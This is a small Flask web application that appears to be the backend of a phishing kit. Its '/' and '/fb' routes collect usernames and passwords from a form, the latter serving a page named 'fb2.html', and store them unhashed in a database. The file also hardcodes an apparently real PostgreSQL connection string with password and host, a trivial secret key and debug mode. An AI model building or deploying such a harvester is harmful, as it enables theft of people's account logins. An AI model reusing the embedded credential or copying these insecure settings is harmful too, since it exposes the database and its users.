from flask import  Flask,render_template, redirect, request, url_for
from datetime import datetime
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config["SQLALCHEMY_DATABASE_URI"] = "postgres://oimvxornjnxwvv:a7ceb9e2af2d819ce2761eeb8c31f3c3c8453428b2d10cb54df3a414e2ff219c@ec2-50-17-197-184.compute-1.amazonaws.com:5432/ddjieebdtrcfsl"
app.secret_key = "secret"
db = SQLAlchemy(app)

class Users(db.Model):
	__tablename__ = "users"
	id = db.Column(db.Integer,primary_key = True)
	username = db.Column(db.String(20),unique = False, nullable = False)
	password = db.Column(db.String(20), unique = False, nullable = False)
	date = db.Column(db.String(20), nullable = True)
	
@app.route("/", methods = ["GET","POST"])
def home():
	if(request.method == "POST"):
		name = request.form.get("name")
		password = request.form.get("password")
		entry = Users(username = name, password = password, date = datetime.now())
		db.session.add(entry)
		db.session.commit()
		return redirect(url_for("done"))
	return render_template("index.html")

@app.route("/fb", methods= ["GET","POST"])
def fb():
	if(request.method == "POST"):
		name = request.form.get("name")
		password = request.form.get("password")
		data = Users(username = name, password = password, date = datetime.now())
		db.session.add(data)
		db.session.commit()
		return redirect(url_for("done"))
	return render_template("fb2.html")

@app.route("/thanks")
def done():
	return  render_template("thanks.html")
app.run(debug=True)
